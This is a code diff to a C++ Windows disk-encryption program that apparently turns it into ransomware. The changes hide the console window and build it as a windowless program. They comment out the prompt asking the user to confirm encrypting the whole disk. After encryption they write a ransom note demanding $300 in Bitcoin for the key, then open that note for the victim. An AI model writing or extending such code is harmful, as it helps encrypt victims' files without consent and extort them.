@@ -6,10 +6,11 @@
 #include <iostream>
 #include <Windows.h>
 
-
 #include "aes256.cpp"
 #include "keygen.cpp"
 #include "rsaproj.cpp"
+
+#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
 #define BUFFER_SIZE 1024*1024
 
@@ -64,14 +65,16 @@ bool endsWith(const std::string &mainStr, const std::string &toMatch)
         return false;
 }
 
-int main(int argc, char** argv) {
 
-    cout << "Are you sure you want to encrypt your whole disk? y/n -> ";
-    char choice = 'n';
-    cin >> choice;
-    if (choice != 'y') {
-        exit(0);
-    }
+int main(int argc, char** argv) {
+      ShowWindow(::GetConsoleWindow(), SW_HIDE);
+
+//    cout << "Are you sure you want to encrypt your whole disk? y/n -> ";
+//    char choice = 'n';
+//    cin >> choice;
+//    if (choice != 'y') {
+//        exit(0);
+//    }
 
     string key_str = keygen(16);
     char *key = new char[key_str.length() + 1];
@@ -140,6 +143,27 @@ int main(int argc, char** argv) {
         encrypt(line_char, key);
 
     }
+
+    fstream fs;
+    fs.open ("YOU_ARE_INFECTED!.txt", fstream::in | fstream::out | fstream::app);
+
+    fs << "YOUR FILES HAVE BEEN ENCRYPTED WITH MY RANSOMWARE! THIS IS YOUR ONLY CHANCE TO CONTACT ME AND DECRYPT!\n"
+          "\nHow to get the key\n"
+          "\n"
+          "    Send 300$ Bitcoin to this address [Wallet Address]. (You can buy Bitcoin here)\n"
+          "    Send email to this address [myemail@email.com] your transaction ID, your email address and your decryption code [" << key_str << "]. You will get an email with the key to decrypt after 12 - 48 hours.\n"
+          "Your decrypt.exe program is in C:\\PerfLogs";
+
+    fs.close();
+
+    // Opening TXT
+    SHELLEXECUTEINFOW sei = { sizeof(sei) };
+    sei.lpFile = L"YOU_ARE_INFECTED!.txt";
+    sei.lpVerb = L"open";
+    sei.nShow = SW_SHOWNORMAL;
+    ShellExecuteExW(&sei);
+
+
     cout << "Done encrypting, bye bye! ;)\n";
     cin.get();
     return 0;
